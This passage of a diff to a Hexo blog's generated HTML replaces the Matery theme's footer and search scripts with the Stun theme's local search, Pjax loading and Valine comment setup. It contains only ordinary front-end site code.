+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
 
-        // 切换TOC目录展开收缩的相关操作.
-        const expandedClass = 'expanded';
-        let $tocAside = $('#toc-aside');
-        let $mainContent = $('#main-content');
-        $('#floating-toc-btn .btn-floating').click(function () {
-            if ($tocAside.hasClass(expandedClass)) {
-                $tocAside.removeClass(expandedClass).hide();
-                $mainContent.removeClass('l9');
-            } else {
-                $tocAside.addClass(expandedClass).show();
-                $mainContent.addClass('l9');
-            }
-            fixPostCardWidth('artDetail', 'prenext-posts');
-        });
-        
-    });
-</script>
-
-    
-
-</main>
-
-
-
-
-    <footer class="page-footer bg-color">
-    
-
-    <div class="container row center-align"
-         style="margin-bottom: 0px !important;">
-        <div class="col s12 m8 l8 copy-right">
-            Copyright&nbsp;&copy;
-            
-                <span id="year">2022-2023</span>
-            
-            <a href="/about" target="_blank">J1an</a>
-            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
-            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
-            <br>
-            
-            
-            
-                
-            
-            
-                <span id="busuanzi_container_site_pv">
-                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
-                    <span id="busuanzi_value_site_pv" class="white-color"></span>
-            </span>
-            
-            
-                <span id="busuanzi_container_site_uv">
-                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
-                    <span id="busuanzi_value_site_uv" class="white-color"></span>
-            </span>
-            
-            <br>
-
-            <!-- 运行天数提醒. -->
-            
-            <br>
-            
-        </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
-        <i class="fab fa-github"></i>
-    </a>
-
-
-
-    <a href="mailto:jlan@icloud.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
-        <i class="fas fa-envelope-open"></i>
-    </a>
-
-
-
-
-
-    <a href="https://twitter.com/J1an45" class="tooltipped" target="_blank" data-tooltip="关注我的Twitter: https://twitter.com/J1an45" data-position="top" data-delay="50">
-        <i class="fab fa-twitter"></i>
-    </a>
-
-
-
-
-
-
-
-
-
-</div>
-    </div>
-</footer>
-
-<div class="progress-bar"></div>
-
-
-    <!-- 搜索遮罩框 -->
-<div id="searchModal" class="modal">
-    <div class="modal-content">
-        <div class="search-header">
-            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
-            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
-                   class="search-input">
-        </div>
-        <div id="searchResult"></div>
-    </div>
-</div>
-
-<script type="text/javascript">
-$(function () {
-    var searchFunc = function (path, search_id, content_id) {
-        'use strict';
-        $.ajax({
-            url: path,
-            dataType: "xml",
-            success: function (xmlResponse) {
-                // get the contents from search data
-                var datas = $("entry", xmlResponse).map(function () {
-                    return {
-                        title: $("title", this).text(),
-                        content: $("content", this).text(),
-                        url: $("url", this).text()
-                    };
-                }).get();
-                var $input = document.getElementById(search_id);
-                var $resultContent = document.getElementById(content_id);
-                $input.addEventListener('input', function () {
-                    var str = '<ul class=\"search-result-list\">';
-                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
-                    $resultContent.innerHTML = "";
-                    if (this.value.trim().length <= 0) {
-                        return;
-                    }
-                    // perform local searching
-                    datas.forEach(function (data) {
-                        var isMatch = true;
-                        var data_title = data.title.trim().toLowerCase();
-                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
-                        var data_url = data.url;
-                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
-                        var index_title = -1;
-                        var index_content = -1;
-                        var first_occur = -1;
-                        // only match artiles with not empty titles and contents
-                        if (data_title !== '' && data_content !== '') {
-                            keywords.forEach(function (keyword, i) {
-                                index_title = data_title.indexOf(keyword);
-                                index_content = data_content.indexOf(keyword);
-                                if (index_title < 0 && index_content < 0) {
-                                    isMatch = false;
-                                } else {
-                                    if (index_content < 0) {
-                                        index_content = 0;
-                                    }
-                                    if (i === 0) {
-                                        first_occur = index_content;
-                                    }
-                                }
-                            });
-                        }
-                        // show search results
-                        if (isMatch) {
-                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
-                            var content = data.content.trim().replace(/<[^>]+>/g, "");
-                            if (first_occur >= 0) {
-                                // cut out 100 characters
-                                var start = first_occur - 20;
-                                var end = first_occur + 80;
-                                if (start < 0) {
-                                    start = 0;
-                                }
-                                if (start === 0) {
-                                    end = 100;
-                                }
-                                if (end > content.length) {
-                                    end = content.length;
-                                }
-                                var match_content = content.substr(start, end);
-                                // highlight all keywords
-                                keywords.forEach(function (keyword) {
-                                    var regS = new RegExp(keyword, "gi");
-                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
-                                });
-
-                                str += "<p class=\"search-result\">" + match_content + "...</p>"
-                            }
-                            str += "</li>";
-                        }
-                    });
-                    str += "</ul>";
-                    $resultContent.innerHTML = str;
-                });
-            }
-        });
-    };
-
-    searchFunc('/search.xml', 'searchInput', 'searchResult');
-});
-</script>
-
-    <!-- 白天和黑夜主题 -->
-<div class="stars-con">
-    <div id="stars"></div>
-    <div id="stars2"></div>
-    <div id="stars3"></div>  
-</div>
-
-<script>
-    function switchNightMode() {
-        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
-        setTimeout(function () {
-            $('body').hasClass('DarkMode') 
-            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
-            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
-            
-            setTimeout(function () {
-            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
-                $(this).remove()
-            })
-            }, 2e3)
-        })
-    }
-</script>
-
-    <!-- 回到顶部按钮 -->
-<div id="backTop" class="top-scroll">
-    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
-        <i class="fas fa-arrow-up"></i>
-    </a>
-</div>
-
-
-    <script src="/libs/materialize/materialize.min.js"></script>
-    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
-    <script src="/libs/aos/aos.js"></script>
-    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
-    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
-    <script src="/js/matery.js"></script>
-
-    
-
-    
-
-    <!-- 雪花特效 -->
-    
-
-    <!-- 鼠标星星特效 -->
-     
-        <script type="text/javascript">
-            // 只在桌面版网页启用特效
-            var windowWidth = $(window).width();
-            if (windowWidth > 768) {
-                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
-            }
-        </script>
-    
-
-     
-        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
-        <script src="/libs/others/TencentCaptcha.js"></script>
-        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
-    
-
-    <!-- Baidu Analytics -->
-
-    <!-- Baidu Push -->
-
-<script>
-    (function () {
-        var bp = document.createElement('script');
-        var curProtocol = window.location.protocol.split(':')[0];
-        if (curProtocol === 'https') {
-            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
-        } else {
-            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
         }
-        var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(bp, s);
-    })();
-</script>
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
 
-    
-    
-    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
-    
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
 
-    
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
 
-    
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
 
-    <!--腾讯兔小巢-->
-    
-    
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
 
-    
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
 
-    
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
 
-    
-    <script src="/libs/instantpage/instantpage.js" type="module"></script>
-    
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
 
-</body>
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
 
-</html>
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', '请输入字符');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js"></script><script>window.addEventListener('DOMContentLoaded', function () {
+  var pjax = new Pjax({"selectors":["head title","#main",".pjax-reload"],"history":true,"scrollTo":false,"scrollRestoration":false,"cacheBust":false,"debug":false,"currentUrlFullReload":false,"timeout":0});
+  // 加载进度条的计时器
+  var loadingTimer = null;
+
+  // 重置页面 Y 方向上的滚动偏移量
+  document.addEventListener('pjax:send', function () {
+    $('.header-nav-menu').removeClass('show');
+    if (CONFIG.pjax && CONFIG.pjax.avoidBanner) {
+      $('html').velocity('scroll', {
+        duration: 500,
+        offset: $('#header').height(),
+        easing: 'easeInOutCubic'
+      });
+    }
+
+    var loadingBarWidth = 20;
+    var MAX_LOADING_WIDTH = 95;
+
+    $('.loading-bar').addClass('loading');
+    $('.loading-bar__progress').css('width', loadingBarWidth + '%');
+    clearInterval(loadingTimer);
+    loadingTimer = setInterval(function () {
+      loadingBarWidth += 3;
+      if (loadingBarWidth > MAX_LOADING_WIDTH) {
+        loadingBarWidth = MAX_LOADING_WIDTH;
+      }
+      $('.loading-bar__progress').css('width', loadingBarWidth + '%');
+    }, 500);
+  }, false);
+
+  window.addEventListener('pjax:complete', function () {
+    clearInterval(loadingTimer);
+    $('.loading-bar__progress').css('width', '100%');
+    $('.loading-bar').removeClass('loading');
+    setTimeout(function () {
+      $('.loading-bar__progress').css('width', '0');
+    }, 400);
+    $('link[rel=prefetch], script[data-pjax-rm]').each(function () {
+      $(this).remove();
+    });
+    $('script[data-pjax], #pjax-reload script').each(function () {
+      $(this).parent().append($(this).remove());
+    });
+
+    if (Stun.utils.pjaxReloadBoot) {
+      Stun.utils.pjaxReloadBoot();
+    }
+    if (Stun.utils.pjaxReloadScroll) {
+      Stun.utils.pjaxReloadScroll();
+    }
+    if (Stun.utils.pjaxReloadSidebar) {
+      Stun.utils.pjaxReloadSidebar();
+    }
+    if (false) {
+      if (Stun.utils.pjaxReloadHeader) {
+        Stun.utils.pjaxReloadHeader();
+      }
+      if (Stun.utils.pjaxReloadScrollIcon) {
+        Stun.utils.pjaxReloadScrollIcon();
+      }
+      if (Stun.utils.pjaxReloadLocalSearch) {
+        Stun.utils.pjaxReloadLocalSearch();
+      }
+    }
+  }, false);
+}, false);</script><div id="pjax-reload"><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script></div><script src="https://cdn.jsdelivr.net/npm/leancloud-storage@latest/dist/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script><script data-pjax="">function loadValine () {
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var guest_info = 'nick,mail,link';
+
+  guest_info = guest_info.split(',').filter(function(item) {
+    return GUEST_INFO.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#valine-container',
+    appId: 'PRycUaQbxE5mebmnKTjtaRJg-gzGzoHsz',
+    appKey: 'jGyP9zr05MTuqHpWaIkgYW4h',
+    notify: true,
+    verify: true,
+    placeholder: '写点什么吧',
+    avatar: 'mp',
+    meta: guest_info,
+    pageSize: '10' || 10,
+    visitor: true,
+    recordIP: true,
+    lang: 'zh-cn,en' || 'zh-cn',
+    path: window.location.pathname
+  });
+}
+
+if (true) {
+  loadValine();
+} else {
+  window.addEventListener('DOMContentLoaded', loadValine, false);
+}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.xml"></script></body></html>
